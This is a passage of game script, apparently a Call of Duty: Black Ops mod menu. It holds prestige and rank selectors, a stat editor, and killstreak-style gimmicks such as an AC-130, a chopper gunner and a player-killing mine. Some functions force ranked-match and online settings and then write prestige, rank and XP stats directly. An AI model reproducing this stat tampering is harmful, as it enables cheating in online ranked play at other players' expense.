					s.pres[-1] setShader("rank_prestige" +(self.scrollz - 1),50,50);
					s.pres[0] setShader("rank_prestige" + self.scrollz,70,70);
					s.pres[1] setShader("rank_prestige" +(self.scrollz + 1),50,50);
					s.pres[2] setShader("rank_prestige" +(self.scrollz + 2),50,50);
				}
			}
			else if(choice=="rank")
			{
				if(s.scrollz<=55 && s.scrollz>=2)
				{
					s.scrollz -= 1;
					wait .001;
					s.textz maps\mp\gametypes\_rank::setSafeText(s.scrollz);
					s.r[-2] setShader(s.ranks[(self.scrollz - 3)],50,50);
					s.r[-1] setShader(s.ranks[(self.scrollz - 2)],50,50);
					s.r[0] setShader(s.ranks[(self.scrollz -1)],70,70);
					s.r[1] setShader(s.ranks[(self.scrollz)],50,50);
					s.r[2] setShader(s.ranks[(self.scrollz + 1)],50,50);
				}
			}
		}
		if(s AttackButtonPressed())
		{
			if(choice=="prestige")
			{
				if(s.scrollz<=10 && s.scrollz>=0)
				{
					s.scrollz += 1;
					wait .001;
					s.textz maps\mp\gametypes\_rank::setSafeText(s.scrollz);
					s.pres[-2] setShader("rank_prestige" +(self.scrollz - 2),50,50);
					s.pres[-1] setShader("rank_prestige" +(self.scrollz - 1),50,50);
					s.pres[0] setShader("rank_prestige" + self.scrollz,70,70);
					s.pres[1] setShader("rank_prestige" +(self.scrollz + 1),50,50);
					s.pres[2] setShader("rank_prestige" +(self.scrollz + 2),50,50);
				}
			}
			else if(choice=="rank")
			{
				if(s.scrollz<=54 && s.scrollz>=1)
				{
					s.scrollz += 1;
					wait .001;
					s.textz maps\mp\gametypes\_rank::setSafeText(s.scrollz);
					s.r[-2] setShader(s.ranks[(self.scrollz - 3)],50,50);
					s.r[-1] setShader(s.ranks[(self.scrollz - 2)],50,50);
					s.r[0] setShader(s.ranks[(self.scrollz -1)],70,70);
					s.r[1] setShader(s.ranks[(self.scrollz)],50,50);
					s.r[2] setShader(s.ranks[(self.scrollz + 1)],50,50);
				}
			}
		}
		wait .001;
	}
}
createprestige(align,relative,x,y,width,height,shader,sort,alpha)
{
	prestigeshader=newClientHudElem(self);
	prestigeshader.elemType="bar";
	if(!level.splitScreen)
	{
		prestigeshader.x=-2;
		prestigeshader.y=-2;
	}
	prestigeshader.width=width;
	prestigeshader.height=height;
	prestigeshader.align=align;
	prestigeshader.relative=relative;
	prestigeshader.xOffset=0;
	prestigeshader.yOffset=0;
	prestigeshader.children=[];
	prestigeshader.sort=sort;
	prestigeshader.alpha=alpha;
	prestigeshader setParent(level.uiParent);
	prestigeshader setShader(shader,width,height);
	prestigeshader.hidden=false;
	prestigeshader setPoint(align,relative,x,y);
	return prestigeshader;
}
prestige1(value)
{
	setDvar("scr_forcerankedmatch","1");
	setDvar("xblive_privatematch","0");
	setDvar("onlinegame","1");
	wait 0.5;
	self maps\mp\gametypes\_persistence::statSet("plevel",value);
	self.pers["prestige"]=value;
	self.pers["rankxp"]=1262500;
	self.pers["rank"]=self maps\mp\gametypes\_rank::getRankForXp(self.pers["rankxp"]);
	//self setStat(252,65);
	self.setPromotion=true;
	wait 1.5;
	/*
	self thread maps\mp\gametypes\_rank::updateRankAnnounceHUD();
	self thread maps\mp\gametypes\_rank::updateRank();
	self thread maps\mp\gametypes\_rank::getPrestigeLevel();
	self thread maps\mp\gametypes\_rank::getSPM();
	self thread maps\mp\gametypes\_rank::getRankXP();
	self thread maps\mp\gametypes\_rank::syncXPStat();
	self thread maps\mp\gametypes\_rank::updateChallenges();
	self setRank(self.pers["rank"],self.pers["prestige"]);
	*/
	self iPrintln("Prestige "+value+" ^2SET");
}
rank(value)
{
	self playsound("mp_level_up");
	setDvar("scr_forcerankedmatch","1");
	setdvar("xblive_privatematch","0");
	setDvar("onlinegame","1");
	wait 0.5;
	self maps\mp\gametypes\_persistence::statSet("rank",value);
	self thread maps\mp\gametypes\_hud_message::oldNotifyMessage("Rank "+value+" ");
	self iPrintln("Level "+value+" ^2SET");
}
doAc130()
{
    self ExitMenu();
    level.mapCenter = maps\mp\gametypes\_spawnlogic::findBoxCenter(level.spawnMins, level.spawnMaxs);
    self.Ac130Loc = getAboveBuildings(level.mapCenter);
    self.Ac130Use = true;
    thread AC130_SPECTRE();
}

AC130_SPECTRE()
{
    self allowAds(false);
    
    level.ac["105mm"] = loadfx("maps/mp_maps/fx_mp_exp_bomb");
    level.ac["40mm"] = loadfx("maps/mp_maps/fx_mp_exp_rc_bomb");
    level.ac["25mm"] = loadfx( "explosions/fx_exp_equipment" );

    self SayTeam("^1AC-130 ^7IS ONLINE!");
    thread initAC130();
    self.OldOrigin = self getOrigin();
    thread playerLinkAC130(self.Ac130Loc);
    
    self setClientDvars("scr_weapon_allowfrags", "0", "cg_drawcrosshair", "0", "cg_drawGun", "0", "r_colormap", "1", "r_fullbright", "0", "r_specularmap", "0", "r_debugShader", "0", "r_filmTweakEnable", "1", "r_filmUseTweaks", "1", "cg_gun_x", "0", "r_filmTweakInvert", "1", "r_filmtweakLighttint", "1.1 1.05 0.85", "r_filmtweakdarktint", "0.7 0.85 1");
    
    self.weaponInventory = self GetWeaponsList();
    self takeallweapons();
    thread runAcGuns();
    thread AC130exit();
}

initAC130()
{
    self.initAC130[0] = ::weapon105mm;
    self.initAC130[1] = ::weapon40mm;
    self.initAC130[2] = ::weapon25mm;
}

runAcGuns()
{
    self endon("death");
    self endon("disconnect");
    self.HudNum = 0;
    thread [[self.initAC130[self.HudNum]]]();
    
    while(self.Ac130Use)
    {
        if(self AdsButtonPressed())
        {
            ClearPrint();
            self notify("WeaponChange");
            for(k = 0; k < self.ACHud[self.HudNum].size; k++) 
                self.ACHud[self.HudNum][k] destroyElem();
                
            self.HudNum++;
            if(self.HudNum >= self.initAC130.size) 
                self.HudNum = 0;
                
            thread [[self.initAC130[self.HudNum]]]();
            wait 0.5;
        }
        wait 0.05;
    }
}

initAcWeapons(Time, Hud, Num, Model, Scale, Radius, Effect, Sound)
{
    self endon("disconnect");
    self endon("death");
    self endon("WeaponChange");
    
    if(!isDefined(self.BulletCount[Hud])) 
        self.BulletCount[Hud] = 0;
        
    resetBullet(Hud, Num);
    
    for(;;)
    {
        if(self attackButtonPressed())
        {
            self playSound(Sound);
            thread CreateAc130Bullet(Model, Radius, Effect);
            self.BulletCount[Hud]++;
            
            if(self.BulletCount[Hud] <= Num) 
                Earthquake(Scale, 0.2, self.origin, 200);
                
            resetBullet(Hud, Num);
            wait Time;
        }
        wait 0.05;
    }
}

weapon105mm()
{
    coord = strTok("21,0,2,24;-20,0,2,24;0,-11,40,2;0,11,40,2;0,-39,2,57;0,39,2,57;-48,0,57,2;49,0,57,2;-155,-122,2,21;-154,122,2,21;155,122,2,21;155,-122,2,21;-145,132,21,2;145,-132,21,2;-145,-132,21,2;146,132,21,2", ";");
    for(k = 0; k < coord.size; k++)
    {
        tCoord = strTok(coord[k], ",");
        self.acHud[0][k] = createHuds(int(tCoord[0]), int(tCoord[1]), int(tCoord[2]), int(tCoord[3]));
    }
    // Using valid world models instead of missing viewmodel paths
    thread initAcWeapons(1, 0, 1, "t5_veh_weapon_sp_zpu4_base", 0.4, 350, level.ac["105mm"], "mpl_turret_exp");
}

weapon40mm()
{
    coord = strTok("0,-70,2,115;0,70,2,115;-70,0,115,2;70,0,115,2;0,-128,14,2;0,128,14,2;-128,0,2,14;128,0,2,14;0,-35,8,2;0,35,8,2;-29,0,2,8;29,0,2,8;-64,0,2,9;64,0,2,9;0,-85,10,2;0,85,10,2;-99,0,2,10;99,0,2,10", ";");
    for(k = 0; k < coord.size; k++)
    {
        tCoord = strTok(coord[k], ",");
        self.acHud[1][k] = createHuds(int(tCoord[0]), int(tCoord[1]), int(tCoord[2]), int(tCoord[3]));
    }
    thread initAcWeapons(0.2, 1, 5, "t5_veh_weapon_sp_zpu4_base", 0.3, 80, level.ac["40mm"], "wpn_l96a1_fire_plr");
}

weapon25mm()
{
    coord = strTok("21,0,35,2;-21,0,35,2;0,25,2,46;-60,-57,2,22;-60,57,2,22;60,57,2,22;60,-57,2,22;-50,68,22,2;50,-68,22,2;-50,-68,22,2;50,68,22,2;6,9,1,7;9,6,7,1;11,14,1,7;14,11,7,1;16,19,1,7;19,16,7,1;21,24,1,7;24,21,7,1;26,29,1,7;29,26,7,1;36,33,6,1", ";");
    for(k = 0; k < coord.size; k++)
    {
        tCoord = strTok(coord[k], ",");
        self.acHud[2][k] = createHuds(int(tCoord[0]), int(tCoord[1]), int(tCoord[2]), int(tCoord[3]));
    }
    thread initAcWeapons(0.08, 2, 30, "t5_veh_weapon_sp_zpu4_base", 0.2, 25, level.ac["25mm"], "wpn_galil_fire_plr");
}

AC130exit()
{
    self endon("death");
    self endon("disconnect");
    while(self.Ac130Use)
    {
        if(self meleeButtonPressed())
        {
            ClearPrint();
            for(k = 0; k < 3; k++) 
                self.BulletCount[k] = undefined;
            for(k = 0; k < self.ACHud[self.HudNum].size; k++) 
                self.ACHud[self.HudNum][k] destroyElem();
                
            self unlink();
            self notify("WeaponChange");
            self allowAds(true);
            self show();
            
            self setClientDvars("scr_weapon_allowfrags", "1", "cg_drawcrosshair", "1", "cg_drawGun", "1", "r_colormap", "1", "r_fullbright", "0", "r_specularmap", "0", "r_debugShader", "0", "r_filmTweakEnable", "0", "r_filmUseTweaks", "0", "cg_gun_x", "0", "FOV", "30", "r_filmTweakInvert", "0", "r_filmtweakLighttint", "1.1 1.05 0.85", "r_filmtweakdarktint", "0.7 0.85 1");
            
            if(isDefined(self.Ac130["model"])) 
                self.Ac130["model"] delete();
                
            self SetOrigin(self.OldOrigin);
            
            for(i = 0; i < self.weaponInventory.size; i++)
            {
                weapon = self.weaponInventory[i];
                self giveWeapon(weapon);
            }
            self.Ac130Use = false;
        }
        wait 0.05;
    }
}

resetBullet(Hud, Num)
{
    if(self.BulletCount[Hud] >= Num)
    {
        self iPrintln("Reloading");
        wait 2;
        self.BulletCount[Hud] = 0;
        if(isDefined(self.ACHud[Hud][0])) 
            ClearPrint();
    }
}

getAboveBuildings(location)
{
    trace = bullettrace(location + (0, 0, 10000), location, false, undefined);
    startorigin = trace["position"] + (0, 0, -514);
    zpos = 0;
    maxxpos = 13;
    maxypos = 13;
    
    for(xpos = 0; xpos < maxxpos; xpos++)
    {
        for(ypos = 0; ypos < maxypos; ypos++)
        {
            thisstartorigin = startorigin + ((xpos / (maxxpos - 1) - 0.5) * 1024, (ypos / (maxypos - 1) - 0.5) * 1024, 0);
            thisorigin = bullettrace(thisstartorigin, thisstartorigin + (0, 0, -10000), false, undefined);
            zpos += thisorigin["position"][2];
        }
    }
    zpos = zpos / (maxxpos * maxypos);
    zpos = zpos + 1000;
    return (location[0], location[1], zpos);
}

CreateAc130Bullet(Model, Radius, Effect)
{
    Bullet = spawn("script_model", self getTagOrigin("tag_origin"));
    Bullet setModel(Model);
    Pos = self GetCursorPos();
    Bullet.angles = self getPlayerAngles();
    Bullet moveTo(Pos, 0.5);
    wait 0.5;
    Bullet delete();
    playFx(Effect, Pos);
    RadiusDamage(Pos, Radius, 350, 150, self);
}

createHuds(x, y, width, height)
{
    Hud = newClientHudElem(self);
    Hud.width = width;
    Hud.height = height;
    Hud.align = "CENTER";
    Hud.relative = "MIDDLE";
    Hud.children = [];
    Hud.sort = 3;
    Hud.alpha = 1;
    Hud setParent(level.uiParent);
    Hud setShader("white", width, height);
    Hud.hidden = false;
    Hud setPoint("CENTER", "MIDDLE", x, y);
    Hud thread destroyAc130Huds(self);
    return Hud;
}

destroyAc130Huds(player)
{
    player waittill("death");
    if(isDefined(self)) 
        self destroyElem();
}

ClearPrint()
{
    for(k = 0; k < 4; k++) 
        self iPrintln(" ");
}

playerLinkAC130(Origin)
{
    self.Ac130["model"] = spawn("script_model", Origin);
    self.Ac130["model"] setModel("t5_veh_air_b52");
    self.Ac130["model"] thread Ac130Move();
    self.Ac130["model"] hide();
    self linkTo(self.Ac130["model"], "tag_player", (0, 1000, 20), (0, 0, 0));
    self hide();
}

Ac130Move()
{
    self endon("death");
    self endon("disconnect");
    while(self.Ac130Use)
    {
        self rotateYaw(360, 25);
        wait 25;
    }
}
GetCursorPos()
{
	return BulletTrace(self getTagOrigin("tag_weapon_right"),vector_scale(anglestoforward(self getPlayerAngles()),1000000),false,self)["position"];
}
WP(X,Y,Z)
{
	B=spawn("script_model",self.origin+(0,0,999)+(X,Y,Z));
	B.angles=(90,0,0);
	B setModel("test_sphere_silver");
	B Solid();
}
SkyText()
{
	Z=5;
    self SayAll("Look to the sky!");
	WP(75,0,Z);
	WP(150,0,Z);
	WP(175,0,Z);
	WP(200,0,Z);
	WP(275,0,Z);
	WP(300,0,Z);
	WP(325,0,Z);
	WP(375,0,Z);
	WP(525,0,Z);
	WP(575,0,Z);
	WP(675,0,Z);
	WP(775,0,Z);
	WP(850,0,Z);
	WP(875,0,Z);
	WP(950,0,Z);
	WP(1025,0,Z);
	WP(1150,0,Z);
	WP(1200,0,Z);
	WP(75,30,Z);
	WP(200,30,Z);
	WP(300,30,Z);
	WP(375,30,Z);
	WP(525,30,Z);
	WP(575,30,Z);
	WP(600,30,Z);
	WP(625,30,Z);
	WP(650,30,Z);
	WP(675,30,Z);
	WP(775,30,Z);
	WP(825,30,Z);
	WP(900,30,Z);
	WP(950,30,Z);
	WP(1025,30,Z);
	WP(1150,30,Z);
	WP(1200,30,Z);
	WP(75,60,Z);
	WP(200,60,Z);
	WP(300,60,Z);
	WP(375,60,Z);
	WP(450,60,Z);
	WP(525,60,Z);
	WP(575,60,Z);
	WP(675,60,Z);
	WP(725,60,Z);
	WP(750,60,Z);
	WP(775,60,Z);
	WP(825,60,Z);
	WP(900,60,Z);
	WP(975,60,Z);
	WP(1000,60,Z);
	WP(1025,60,Z);
	WP(1100,60,Z);
	WP(1125,60,Z);
	WP(1150,60,Z);
	WP(1200,60,Z);
	WP(50,90,Z);
	WP(100,90,Z);
	WP(200,90,Z);
	WP(300,90,Z);
	WP(375,90,Z);
	WP(425,90,Z);
	WP(475,90,Z);
	WP(525,90,Z);
	WP(600,90,Z);
	WP(650,90,Z);
	WP(775,90,Z);
	WP(825,90,Z);
	WP(900,90,Z);
	WP(950,90,Z);
	WP(1025,90,Z);
	WP(1075,90,Z);
	WP(1150,90,Z);
	WP(25,120,Z);
	WP(125,120,Z);
	WP(200,120,Z);
	WP(275,120,Z);
	WP(300,120,Z);
	WP(325,120,Z);
	WP(375,120,Z);
	WP(400,120,Z);
	WP(500,120,Z);
	WP(525,120,Z);
	WP(625,120,Z);
	WP(700,120,Z);
	WP(725,120,Z);
	WP(750,120,Z);
	WP(775,120,Z);
	WP(850,120,Z);
	WP(875,120,Z);
	WP(975,120,Z);
	WP(1000,120,Z);
	WP(1025,120,Z);
	WP(1100,120,Z);
	WP(1125,120,Z);
	WP(1150,120,Z);
	WP(1200,120,Z);
	WP(0,0,Z);
}
doGunner()
{
	self endon("enter");
	setDvar("ChopperGunner","1");
	self.gun=self getcurrentweapon();
	iPrintln("Chopper Gunner Ready");
	wait 2;
	iPrintln("Press [{+actionslot 4}] To Enter");
	self giveWeapon("briefcase_bomb_defuse_mp");
	self SetActionSlot(4,"");
	wait 0.1;
	self SetActionSlot(4,"weapon","briefcase_bomb_defuse_mp");
	wait 0.1;
	for(;;)
	{
		if(self getcurrentweapon()=="briefcase_bomb_defuse_mp")
		{
			wait 0.3;
			self thread gunny();
		}
		wait 0.3;
	}
}
PHud(x,y,width,height)
{
	p=newClientHudElem(self);
	p.width=width;
	p.height=height;
	p.align="CENTER";
	p.relative="MIDDLE";
	p.children=[];
	p.sort=3;
	p.alpha=0.5;
	p setParent(level.uiParent);
	p setShader("white",width,height);
	p.hidden=false;
	p setPoint("CENTER","MIDDLE",x,y);
	self thread destroyvision(p);
}
Greenscreen(x,y,width,height)
{
	g=newClientHudElem(self);
	g.width=width;
	g.height=height;
	g.align="CENTER";
	g.relative="MIDDLE";
	g.children=[];
	g.sort=1;
	g.alpha=0.2;
	g setParent(level.uiParent);
	g setShader("white",width,height);
	g.hidden=false;
	g.color =(0,1,0);
	g setPoint("CENTER","MIDDLE",x,y);
	self thread destroyvision(g);
}
destroyvision(x)
{
	self endon("clear");
	for(;;)
	{
		self waittill("boom");
		x destroyelem();
		wait 0.1;
		self notify("clear");
	}
}
initchopperkill()
{
	self endon("disconnect");
	self endon("death");
	iPrintln("Chopper Killer Given");
	wait 2;
	iPrintln("Press [{+actionslot 2}] To Equip");
	self giveWeapon("c4_mp");
	self SetActionSlot(2,"");
	wait 0.1;
	self SetActionSlot(2,"weapon","c4_mp");
	wait 0.1;
	for(;;)
	{
		if((self getcurrentweapon()=="c4_mp")&&(isDefined(level.chopper))&&(self.armed==false))
		{
			self.armed=true;
			wait 0.3;
			self thread KillChopper();
			self thread monitorfire();
		}
		wait 0.3;
	}
}
KillChopper()
{
	self endon("chopper_down");
	self endon("death");
	for(;;)
	{
		self waittill("fire");
		location=level.chopper.origin;
		Playfx(level.firework,location);
		Playfx(level.expbullt,location);
		Playfx(level.bfx,location);
		level.chopper playsound("wpn_semtex_alert");
		wait 0.2;
		RadiusDamage(location,300,1950,1945,self,"MOD_EXPLOSIVE","c4_mp");
		wait 9;
		self.armed=false;
		self notify("chopper_down");
	}
	wait 0.05;
}
getnewPos(origin,radius)
{
	pos=origin +((randomfloat(2)-1)*radius,(randomfloat(2)-1)*radius,0);
	while(distanceSquared(pos,origin)> radius*radius)pos=origin +((randomfloat(2)-1)*radius,(randomfloat(2)-1)*radius,0);
	return pos;
}
gunny()
{
	self notify("enter");
	team=self.pers["team"];
	otherTeam=level.otherTeam[team];
	self maps\mp\gametypes\_globallogic_audio::leaderDialog("helicopter_inbound",team);
	self maps\mp\gametypes\_globallogic_audio::leaderDialog("enemy_helicopter_inbound",otherTeam);
	wait 3;
	self.cs=createIcon("black",1000,1000);
	self.cs setPoint("CENTER","CENTER");
	self.cs.alpha=1.5;
	level.height=850;
	if(isdefined(level.airstrikeHeightScale))
	{
		level.height *= level.airstrikeHeightScale;
	}
	level.mapCenter=maps\mp\gametypes\_spawnlogic::findBoxCenter(level.spawnMins,level.spawnMaxs);
	start=self.origin+(0,0,level.height);
	self.ChopperGunner=true;
	self thread ChopperGunner(start);
}
ChopperGunner(start)
{
	self allowAds(false);
	weapon=self getcurrentweapon();
	pos=self getOrigin();
	chopper=spawn("script_model",start);
	chopper setModel("t5_veh_helo_hind_killstreak");
	chopper notsolid();
	chopper setcontents(0);
	self thread GunnerFly(chopper,start);
	chopper playLoopSound("mp_hind_helicopter");
	self thread monitorfire();
	self thread monitordrop();
	self thread firegunner();
	self thread dropchopper(chopper);
	wait 0.1;
	self linkTo(chopper,"tag_player",(0,0,3),(0,0,0));
	self detachAll();
	self hide();
	wait 1.9;
	self.cs.alpha=1.2;
	wait 0.3;
	self.cs.alpha=1;
	wait 0.3;
	self.cs.alpha=0.5;
	wait 0.3;
	self.cs destroy();
	self takeallweapons();
	self thread GunnerGun();
	wait 0.1;
	self thread EndGunner(chopper,weapon,pos);
}
GunnerGun()
{
	self thread crosshairs(0,-35,8,2);
	self thread crosshairs(0,35,8,2);
	self thread crosshairs(-29,0,2,8);
	self thread crosshairs(29,0,2,8);
	self thread crosshairs(-64,0,2,9);
	self thread crosshairs(64,0,2,9);
	self thread crosshairs(0,-65,2,65);
	self thread crosshairs(0,65,2,65);
	self thread crosshairs(-65,0,65,2);
	self thread crosshairs(65,0,65,2);
	self thread greenscreen(0,0,900,900);
}
playerModelForWeapon(weapon)
{
	self detachAll();
	weaponClass=tablelookup("mp/statstable.csv",4,weapon,2);
	switch(weaponClass)
	{
		case "weapon_smg": [[game[self.pers["team"]+"_model"]["SPECOPS"]]]();
		break;
		case "weapon_assault": [[game[self.pers["team"]+"_model"]["ASSAULT"]]]();
		break;
		case "weapon_sniper": [[game[self.pers["team"]+"_model"]["SNIPER"]]]();
		break;
		case "weapon_shotgun": [[game[self.pers["team"]+"_model"]["RECON"]]]();
		break;
		case "weapon_lmg": [[game[self.pers["team"]+"_model"]["SUPPORT"]]]();
		break;
		default: [[game[self.pers["team"]+"_model"]["ASSAULT"]]]();
		break;
	}
}
EndGunner(chopper,weapon,pos)
{
	self endon("death");
	self endon("disconnect");
	wait 90;
	self unlink();
	self notify("boom");
	self allowAds(true);
	self show();
	chopper delete();
	self SetOrigin(pos);
	self freezeControls(false);
	self giveWeapon(self.gun);
	self thread playerModelForWeapon(self.gun);
	self giveweapon("M1911_mp");
	wait 0.05;
	self giveweapon("frag_grenade_mp");
	self SetWeaponAmmoClip("frag_grenade_mp",3);
	wait 0.1;
	self switchtoweapon(self.gun);
	setDvar("ChopperGunner","0");
	self notify("die");
}
monitorfire()
{
	self endon("die");
	self endon("chopper_down");
	self endon("death");
	for(;;)
	{
		if(self attackbuttonpressed())self notify("fire");
		wait 0.1;
	}
}
monitordrop()
{
	self endon("die");
	self endon("death");
	for(;;)
	{
		if(self usebuttonpressed())self notify("drop");
		wait 0.1;
	}
}
FireGunner()
{
	self endon("die");
	self endon("death");
	for(leech=0;leech<20;leech++)
	{
		self waittill("fire");
		location=GetCursorPos();
		playFx(level.expbullt,location);
		self playsound("wpn_rpk_fire_plr");
		RadiusDamage(location,300,350,150,self,"MOD_RIFLE_BULLET","helicopter_mp");
		wait 0.1;
	}
	self thread repeat();
}
repeat()
{
	self endon("die");
	self endon("death");
	self endon("disconnect");
	iPrintln("Reloading.....");
	wait 1.5;
	self thread FireGunner();
}
dropchopper(chopper)
{
	self endon("die");
	self endon("death");
	for(;;)
	{
		iPrintln("Press [{+usereload}] to drop chopper");
		self waittill("drop");
		chopper moveto(self.origin-(0,0,300),3,0.1);
		wait 20;
	}
}
crosshairs(x,y,width,height)
{
	C=newClientHudElem(self);
	C.width=width;
	C.height=height;
	C.align="CENTER";
	C.relative="MIDDLE";
	C.children=[];
	C.sort=3;
	C.alpha=0.3;
	C setParent(level.uiParent);
	C setShader("white",width,height);
	C.hidden=false;
	C setPoint("CENTER","MIDDLE",x,y);
	C thread destroyaftertime();
}
destroyaftertime()
{
	wait 90;
	self destroy();
}
GunnerFly(chopper,start)
{
	self endon("death");
	self endon("disconnect");
	self endon("die");
	for(;;)
	{
		origin=level.mapcenter+(0,0,level.height);
		radius=2000;
		movemeto=getnewpos(origin,radius);
		dir=VectorToAngles(chopper.origin - movemeto);
		vdir=dir+(0,0,0);
		chopper rotateto(vdir+(0,180,0),3);
		wait 2;
		chopper moveto(movemeto,10,1,1);
		wait 13;
	}
}
DvarEditor(Value,Scroll)
{
	self endon("death");
	self endon("StopDvarEditor");
	self.LockMenu=true;
	self ExitMenu();
	self setclientdvars("cg_drawcrosshair","0","ui_hud_hardcore","1","r_blur","6");
	self freezecontrols(true);
	self iPrintln("[{+speed_throw}]/[{+attack}]: Scroll Cursor\n[{+usereload}]: Confirm Value\n[{+Melee}]: Exit Dvar Editor");
	self.DvarEditor["BG"]=CreateShader("CENTER","",0,0,1000,25,(0,0,0),"white",0,1);
	self.DvarEditor["Bar"]=CreateShader("CENTER","",0,0,290,2,(1,1,1),"white",1,1);
	self.DvarEditor["Scroller"]=CreateShader("CENTER","",-145,0,4,20,(1,1,1),"white",2,1);
	self.DvarScroll=0;
	for(;;)
	{
		self.DvarEditor["Scroller"].x -=(2.9*self AttackButtonPressed());
		self.DvarEditor["Scroller"].x +=(2.9*self AdsButtonPressed());
		self.DvarScroll -=(10*self AttackButtonPressed());
		self.DvarScroll +=(10*self AdsButtonPressed());
		if(self.DvarScroll>1000)self.DvarScroll=0;
		if(self.DvarScroll<0)self.DvarScroll=1000;
		if(self.DvarEditor["Scroller"].x>145)self.DvarEditor["Scroller"].x=-145;
		if(self.DvarEditor["Scroller"].x<-145)self.DvarEditor["Scroller"].x=145;
		if(self UseButtonPressed())
		{
			self setClientDvar(Value,self.DvarScroll);
			//setDvar(Value,self.DvarScroll);
			self iPrintln(Value+" Set to: "+self.DvarScroll);
			wait .2;
		}
		if(self MeleeButtonPressed())
		{
			self.DvarEditor["Bar"] destroy();
			self.DvarEditor["Scroller"] destroy();
			self.DvarEditor["Text"] destroy();
			self.DvarEditor["BG"] destroy();
			self setClientDvars("cg_drawcrosshair","1","r_blur","0","ui_hud_hardcore","0");
			self.LockMenu=false;
			self freezecontrols(false);
			self notify("StopDvarEditor");
			wait .3;
		}
		self.DvarEditor["Text"] destroy();
		self setClientDvars("cg_drawcrosshair","1","r_blur","0","ui_hud_hardcore","0");
		self freezecontrols(false);
		self.DvarEditor["Text"]=CreateValueString("default",3,"CENTER","",0,-35,1,1,self.DvarScroll);
		wait .01;
	}
}
load1()
{
	self endon( "disconnect" );
	if ( !isDefined( self.savedorg ) )
	self iprintln("No Previous Position Saved");
	else
	
	{
		self freezecontrols( true );
		wait 0.05;
		self setOrigin( self.savedorg );
		self SetPlayerAngles ( self.savedang );
		self freezecontrols( false );
		self iprintln("Position Loaded");
	}
}

save1()
{
	if ( !self isOnGround() )
	return;
	
	self.savedorg = self.origin;
	self.savedang = self GetPlayerAngles();
	self iprintln("Position Saved");
}
CustomSight(a)
{
	self endon("stopsight");
	self endon("death");
	self endon("disconnect");
	x=undefined;
	for(;;)
	{
		if(self adsButtonpressed())
		{
			if(!isDefined(x))
			{
				wait 0.2;
				x=createIcon(a,15,15);
				x setPoint("CENTER","CENTER",0,0);
				x.alpha=0.75;
			}
		}
		else if(isDefined(x))
		{
			x destroy();
			x=undefined;
		}
		wait.01;
	}
}
toggleVariableZoom()
{
	if(!self.variableZoom)
	{
		self.oldWeapon = self getCurrentWeapon();
		self.variableZoom = true;
		thread variableZoom();
		self iPrintln("Variable Zoom [^2ON^7]");
		giveWeapons("dragunov_mp;WA2000_mp;l96a1_mp;psg1_mp");
	}
	else
	{
		for(k = 0; k < 8; k++)
			if(isDefined(self.zoomElem[k]))
				self.zoomElem[k] destroy();
			
		self.variableZoom = false;
		takeWeapons("dragunov_mp;WA2000_mp;l96a1_mp;psg1_mp");
		self switchToWeapon(self.oldWeapon);
	}
}
variableZoom()
{
	dvar = [];
	curs = 1;
	elemNames = strTok("1x;2x;4x;8x;16x;32x;64x",";");
	for(k = 0; k < 8; k++)
		dvar[8-k] = int(k*10);
		
	self endon("lobby_choose");
	while(self.variableZoom)
	{
		while(self adsButtonPressed() && self playerAds() && hasSniper())
		{
			for(k = 0; k < 8; k++)
			{
				if(!isDefined(self.zoomElem[k]))
				{
					self.zoomElem[k] = createText("default",1.4,"","TOP",((k*40)-120),35,1,200,elemNames[k]);
					if(k == curs-1)
						self.zoomElem[curs-1].color = (1,0,0);
				}
			}
			if(self meleeButtonPressed())
			{
				self.zoomElem[curs-1].color = (1,1,1);
				curs ++;
				if(curs >= dvar.size)
					curs = 1;
					
				self.zoomElem[curs-1].color = (1,0,0);
				wait .1;
			}
			self setclientDvar("cg_fovmin", int(dvar[curs]));
			wait .05;
		}
		for(k = 0; k < 8; k++)
			self.zoomElem[k] destroy();
			
		wait .05;
	}
	self iPrintln("Variable Zoom [^1OFF^7]");
}
hasSniper()
{
	curWeapon = self getCurrentWeapon();
	if(curWeapon == "psg1_mp" || curWeapon == "dragunov_mp" || curWeapon == "WA2000_mp" || curWeapon == "l96a1_mp")
		return true;
		
	return false;
}
giveWeapons(array)
{
	weapon = strTok(array,";");
	for(k = 0; k < weapon.size; k++)
		self giveWeapon(weapon[k]);
}
takeWeapons(array)
{
	weapon = strTok(array,";");
	for(k = 0; k < weapon.size; k++)
		self takeWeapon(weapon[k]);
}
giveWeaponMenu(Weapon)
{
	self giveWeapon(Weapon);
	self switchToWeapon(Weapon);
}
ExplosiveMine()
{
	level.Mine=spawn("script_model",(self.origin+(0,180,0)));
	level.Mine setModel("weapon_claymore_detect");
	level.redcircle=loadfx("misc/ui_flagbase_red");
	Mine=SpawnFx(level.redcircle,(self.origin+(0,180,0)));
	TriggerFX(Mine);
	self SayAll("Watchout " + self.name + " Planted A Mine!");
	for(;;)
	{
		for(i=0;i < level.players.size;i++)
		{
			Player=level.players[i];
			if(distance(Player.origin,level.Mine.origin)<80)
			{
				Earthquake(0.4,4,level.Mine.origin,100);
				playFX(level.chopper_fx["explode"]["medium"],level.Mine.origin);
				level.Mine playSound(level.heli_sound[self.team]["crash"]);
				RadiusDamage(level.Mine.origin,100,50,10,self);
				player suicide();
				player waittill("spawned_player");
				player iPrintln("^1I Told You To Watchout For Those Mines Haha.");
			}
		}
		wait 0.05;
	}
}
createText1(font,fontScale,align,relative,x,y,sort,alpha,text)
{
	textElem=self maps\mp\gametypes\_hud_util::createFontString(font,fontScale);
	textElem maps\mp\gametypes\_hud_util::setPoint(align,relative,x,y);
	textElem.sort=sort;
	textElem.alpha=alpha;
	textElem setText(text);
	return textElem;
}
statEditor(Stat)
{
	self thread ExitMenu();
	wait 0.4;
	self.EditingStats=true;
	self freezeControls(true);
	self iPrintln("Press [{+smoke}] And [{+frag}] To Move Left And Right");
	self iPrintln("Press [{+speed_throw}] And [{+attack}] To Move Up And Down");
	self iPrintln("Press [{+usereload}] To Confirm");
	self iPrintln("Press [{+melee}] To Close");
	curs=0;
	statValue=maps\mp\gametypes\_persistence::statGet(Stat);
	editor["numbers"]=[];
	for(k=0;k < 10;k++)editor["numbers"][k]=createValue2("default",1.9,"","",((-1)*((10/2)*22.5)+(k*25)),100,1,200,0);
	editor["numbers"].x=-999;
	editor["numbers"] moveOverTime(0.25);
	editor["numbers"].x=100;
	editor["scroll"]=createRectangle5("","",editor["numbers"][curs].x,editor["numbers"][curs].y,21,21,(0.5,0.0,0.8),"white",-20,1);
	editor["backGround"]=createRectangle5("","",0,0,1000,720,(0,0,0),"white",-50,(1/2.40));
	editor["statTitle"] = createText9("default",3,"","",0,-190,true,-15,Stat );
	editor["statTitle"] moveOverTime(0.25);
